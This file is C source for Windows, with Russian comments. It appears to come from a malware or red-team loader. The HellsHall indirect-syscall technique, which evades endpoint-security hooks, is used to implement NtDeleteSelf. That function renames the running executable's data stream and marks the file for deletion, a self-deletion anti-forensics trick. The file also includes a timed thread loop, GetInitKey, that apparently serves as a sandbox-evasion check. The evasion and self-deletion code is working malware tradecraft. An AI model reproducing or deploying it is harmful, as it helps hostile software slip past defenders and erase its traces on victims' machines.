

#include <stdio.h>
#include <wchar.h>
#include <helper.h>
#include <HellsHall.h>

// Название нового потока данных
#define NEW_STREAM L"NewT"

static void RtlInitUnicodeString(UNICODE_STRING* DestinationString, PCWSTR SourceString) {
    if (SourceString == NULL) {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = NULL;
    }
    else {
        DestinationString->Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR));
        DestinationString->MaximumLength = DestinationString->Length + sizeof(WCHAR);
        DestinationString->Buffer = (PWCHAR)SourceString;
    }
}

static void GetExecutablePathWithoutCRT(wchar_t* buffer, size_t bufferSize) {
    wchar_t tempPath[MAX_PATH];
    GetModuleFileNameW(NULL, tempPath, MAX_PATH);

    wcscpy(buffer, L"\\??\\");
    wcsncat(buffer, tempPath, bufferSize - wcslen(buffer) - 1);
}

typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval
    );

static wchar_t* wcsncat(wchar_t* dest, const wchar_t* src, size_t n) {
    wchar_t* ptr = dest + wcslen(dest);

    while (*src && n--) {
        *ptr++ = *src++;
    }

    *ptr = L'\0';

    return dest;
}

BOOL NtDeleteSelf() 
{
    IO_STATUS_BLOCK IoStatusBlock;
    WCHAR szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO Delete = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

    pHellsHallStruct S = GetHellsHallStruct();

    // Выделение достаточного буфера для структуры 'FILE_RENAME_INFO'
    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        PRINTA("[!] HeapAlloc error: %d\n", GetLastError());
        return FALSE;
    }

    // Очистка структур
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

    // Маркировка файла для удаления (используется во втором вызове SetFileInformationByHandle)
    Delete.DeleteFile = TRUE;

    // Установка имени нового потока данных и его размера в структуре 'FILE_RENAME_INFO'
    pRename->FileNameLength = sizeof(NewStream);
    RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

    OBJECT_ATTRIBUTES vObjectAttributes;
    UNICODE_STRING ustrObjectName;

    wchar_t ptcsNameRet[MAX_PATH + 4]; // Дополнительные символы для "\\?\\"
    GetExecutablePathWithoutCRT(ptcsNameRet, sizeof(ptcsNameRet) / sizeof(wchar_t));

    PRINTA("[!] ptcsNameRet :%S\n", ptcsNameRet);

    RtlInitUnicodeString(&ustrObjectName, ptcsNameRet);
    InitializeObjectAttributes(&vObjectAttributes, &ustrObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    SYSCALL(S->NtOpenFile);
    NTSTATUS status = HellHall(&hFile, DELETE | SYNCHRONIZE, &vObjectAttributes, &IoStatusBlock, FILE_SHARE_READ, NULL);
    if (FAILED(status))
    {
        PRINTA("[!] Error NtOpenFile [R] :%x\n", status);
    }

    // Маркировка для удаления после закрытия дескриптора файла
    SYSCALL(S->NtSetInformationFile);
    status = HellHall(hFile, &IoStatusBlock, pRename, sRename, 10);
    if (FAILED(status)) 
    {
        PRINTA("[!] SetFileInformationByHandle [R] error: %x\n", status);
    }

    SYSCALL(S->NtClose);
    HellHall(hFile);

    RtlInitUnicodeString(&ustrObjectName, ptcsNameRet);
    InitializeObjectAttributes(&vObjectAttributes, &ustrObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    SYSCALL(S->NtOpenFile);
    status = HellHall(&hFile, DELETE | SYNCHRONIZE, &vObjectAttributes, &IoStatusBlock, FILE_SHARE_READ, NULL);
    if (FAILED(status))
    {
        PRINTA("[!] Error NtOpenFile [R] :%x\n", status);
    }

    PRINTA("[i] Del ...\n");

    // Маркировка для удаления после закрытия дескриптора файла
    SYSCALL(S->NtSetInformationFile);
    status = HellHall(hFile, &IoStatusBlock, pRename, sRename, 13);
    if (FAILED(status)) 
    {
        PRINTA("[!] SetFileInformationByHandle [D] error: %x\n", status);

    }

    SYSCALL(S->NtClose);
    HellHall(hFile);

    // Освобождение выделенного буфера
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}

static BOOL LoopThread()
{
    // Создание waitable таймера
    HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    if (hTimer == NULL) {
        // Обработка ошибки создания таймера
        return 1;
    }

    // Установка времени ожидания в 5 секунд
    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -50000000LL; // Время в 100-наносекундных интервалах

    if (!SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
        // Обработка ошибки установки таймера
        CloseHandle(hTimer);
        return 1;
    }

    // Ожидание срабатывания таймера
    WaitForSingleObject(hTimer, INFINITE);

    // Закрытие дескриптора таймера
    CloseHandle(hTimer);
    return TRUE;
}

uint32_t GetInitKey() {

    HANDLE                  hThread = NULL;
    NTSTATUS                STATUS = NULL;
    uint32_t                i = 1;

    LARGE_INTEGER timeout;
    timeout.QuadPart = -20000000LL;

    pHellsHallStruct S = GetHellsHallStruct();

    PRINTA("[!] STARTX \n");

    // Try 10 times, after that return FALSE
    while (i <= 10) 
    {
        SYSCALL(S->NtCreateThreadEx);
        if ((STATUS = HellHall(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, LoopThread, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
            PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
            return 0;
        }

        SYSCALL(S->NtWaitForSingleObject);
        if ((STATUS = HellHall(hThread, FALSE, &timeout)) != 0 && STATUS != STATUS_TIMEOUT) {
            PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
            return 0;
        }

        i += STATUS;

        SYSCALL(S->NtClose);
        if ((STATUS = HellHall(hThread)) != 0) {
            PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
            return 0;
        }

        i++;
     }

    return i;
}

